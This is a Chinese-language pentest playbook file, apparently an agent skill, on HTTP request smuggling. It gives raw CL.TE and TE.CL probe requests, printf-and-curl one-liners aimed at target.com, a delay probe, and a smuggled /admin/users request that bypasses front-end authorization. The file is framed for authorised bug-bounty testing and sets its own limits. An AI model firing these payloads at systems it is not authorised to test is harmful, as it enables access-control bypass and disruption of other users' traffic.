---
name: request-smuggling
domain: http-request-smuggling
modes: [src, redteam, pentest]
exit_artifacts: [reproduction, impact]
---

# HTTP 请求走私（高 ROI，SRC 高危）

## Domain

- 目标有前置代理（Nginx/HAProxy/Cloudflare/AWS ALB/Apache）+ 后端服务器，两者对 `Content-Length` vs `Transfer-Encoding` 解析不一致
- 前端和后端对 `Transfer-Encoding: chunked` 的处理差异
- 接口有 POST/PUT 请求体（GET 无 body 不适用）
- modes: src 高危（可绕过前端安全控制/投毒他人请求/窃取 cookie）；pentest 高价值；redteam 入口价值

## Boundaries

- 走私探测用**无害标记**（`X-Smuggle-Test: <random>`），不构造窃取他人请求的 payload
- 证明可走私即可（响应异常/延时差异），**不实际窃取他人 session**
- 不走私写操作（POST/PUT/DELETE）到他人账户（影响业务红线）
- 探测控制在 5-10 包（走私探测可能影响后端连接池，不大量发包）

## Pivot Hints

- CL.TE 不行 → 试 TE.CL / TE.TE / CL.CL
- 前端是 Nginx → 通常用 CL，后端是 Express/Flask → 用 TE，组合 CL.TE
- 前端是 AWS ALB → 拒绝 TE，试 CL.CL（前端后端都用 CL 但处理顺序不同）
- 走私无回显 → 用延时探测（走私的第二个请求让后端等待）
- 走私成功但无危害 → 试走私到不同路径（前端 `/` 后端 `/admin`）

## Exit Evidence

### src
- E2: 可重放 curl（走私请求）+ 后端响应含走私标记或延时差异
- E3: 证明可绕过前端安全控制（走私 `/admin` 请求到后端 = 前端鉴权被绕过）
- missing_artifacts: [reproduction] 或 [impact]

## Tactics

### 1. CL.TE 探测（前端用 CL，后端用 TE，3-5 包）

前端读 `Content-Length` 转发完整 body，后端按 `Transfer-Encoding: chunked` 解析，多余字节变成下一个请求的开头：

```
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

前端认为 body 13 字节（含 `0\r\n\r\nSMUGGLED`），转发全部。后端按 chunked 读到 `0\r\n\r\n` 认为结束，`SMUGGLED` 残留为下一个请求前缀。

```bash
# 实际 curl 构造（注意 \r\n 精确）
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED' | curl -s --raw -X POST -H "Transfer-Encoding: chunked" -H "Content-Length: 13" --data-binary @- https://target.com/
```

### 2. TE.CL 探测（前端用 TE，后端用 CL，3-5 包）

```bash
# 前端按 chunked 读，后端按 CL 读，body 末尾嵌入走私请求
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n' | curl -s --raw -X POST -H "Content-Length: 3" -H "Transfer-Encoding: chunked" --data-binary @- https://target.com/
```

### 3. 延时探测（无回显时，2-3 包）

走私一个让后端长时间等待的请求，如果前端已返回但后端在等，下一个正常请求会被阻塞（延时）：

```
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 4

0

GET /delay HTTP/1.1
Host: target.com
```

如果走私成功，后端把 `GET /delay...` 当下一个请求，正常请求 `/` 会等待。

### 4. 危害验证（可走私后，2-3 包）

走私到受保护路径证明绕过前端控制：

```
POST / HTTP/1.1
Host: target.com
Content-Length: 40
Transfer-Encoding: chunked

0

GET /admin/users HTTP/1.1
Host: target.com
```

如果 `/admin` 在前端被 403 但走私后返回 200 = 前端鉴权被绕过。

## Common misses

- **只测 CL.TE** → TE.CL 在某些栈（HAProxy + Node）更常见
- **CL 和 TE 同时发** → 有些前端直接拒绝（返回 400），需逐一测试
- **不控制连接复用** → 走私依赖连接复用，curl 默认不复用，需 `--keepalive` 或用 raw socket
- **走私成功但不验证危害** → 走私本身是 phenomenon，必须证明绕过控制/窃取数据才是 verified
- **大量发包** → 走私探测可能污染后端连接池，控制在 10 包内

## Verification（verified 标准）

- **verified**：走私请求 + 正常请求，正常请求响应异常（含走私标记/延时/403 变 200）
- **phenomenon**：前端拒绝 CL+TE 组合（400）/ 无延时差异 / 无响应异常
- **rejected**：前端正确处理（同时有 CL 和 TE 时只用 CL，无歧义）

## ⚠️ 红线

- 探测用无害标记，不构造窃取他人 session 的 payload
- 不走私写操作到他人账户
- 控制在 10 包内（防连接池污染影响业务）
- 验证完如有连接残留，等待自然超时即可（不主动攻击连接池）

## Related

- `doctrine/reflexes.md` 认证绕过 8 大头 — 走私是绕过前端鉴权的路径层手段
- `auth-bypass.md` — 401/403 时走私是路径维度的进阶
- `cache-poisoning.md` — 走私 + 缓存 = 投毒他人响应（高危组合，但验证须谨慎）
